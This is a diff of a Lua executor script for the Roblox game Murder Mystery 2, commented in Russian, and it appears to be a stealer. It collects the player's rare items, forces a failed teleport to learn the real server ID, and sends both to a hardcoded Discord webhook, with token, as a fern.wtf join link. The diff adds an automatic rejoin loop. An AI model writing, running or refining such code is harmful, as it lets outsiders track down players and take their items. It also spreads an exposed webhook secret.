@@ -4,13 +4,12 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local placeId = 142823291 -- MM2 placeId
-local spoofedJobId = game.JobId
 local webhookUrl = "https://discord.com/api/webhooks/1413919894017413203/n3A3GU2C3Z0IhX-TMu3tKjFbCOgOG00Zss4QhhD3VwiCnJxAFlcGKeh6HqTdhaTKr2w4"
-
--- Настройки минимальных редкостей для отправки
 local MinUnique, MinAncient, MinGodly = 1, 1, 1
+local spoofedJobId = game.JobId
 
--- Получение инвентаря игрока
+-- ---------------------------
+-- Функция для получения инвентаря
 local function getInventory()
     local InvModule = require(ReplicatedStorage.Modules.InventoryModule)
     local uniqueItems, ancientItems, godlyItems = {}, {}, {}
@@ -30,15 +29,13 @@ local function getInventory()
             end
         end
     end
-
     return counts, uniqueItems, ancientItems, godlyItems
 end
 
--- Функция для отправки webhook
+-- ---------------------------
+-- Функция отправки webhook
 local function sendWebhook(realJobId)
     local counts, uniqueItems, ancientItems, godlyItems = getInventory()
-
-    -- Проверка, есть ли что отправлять
     if counts.unique >= MinUnique or counts.ancient >= MinAncient or counts.godly >= MinGodly then
         local fernUrl = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. realJobId
         local webhookData = {
@@ -69,16 +66,30 @@ local function sendWebhook(realJobId)
     end
 end
 
--- Ловим неудачный телепорт
+-- ---------------------------
+-- Перехват real JobId + отправка webhook
 TeleportService.TeleportInitFailed:Connect(function(_, _, _, _, teleportInfo)
     if teleportInfo and teleportInfo.ServerInstanceId then
         local realJobId = teleportInfo.ServerInstanceId
         print("Real JobId detected:", realJobId)
         sendWebhook(realJobId)
+
+        -- ---------------------------
+        -- Перезаходчик с queue_on_teleport
+        queue_on_teleport(string.format([[getgenv().JobId = "%s"]], realJobId))
+        for i = 1, 2 do
+            task.spawn(function()
+                pcall(function()
+                    TeleportService:TeleportToPlaceInstance(placeId, realJobId)
+                end)
+            end)
+            task.wait()
+        end
     end
 end)
 
--- Триггерим "spoofed" телепорт, чтобы получить реальный JobId
+-- ---------------------------
+-- Инициализация "спуф-TP", чтобы вызвать TeleportInitFailed
 for i = 1, 2 do
     task.spawn(function()
         pcall(function()
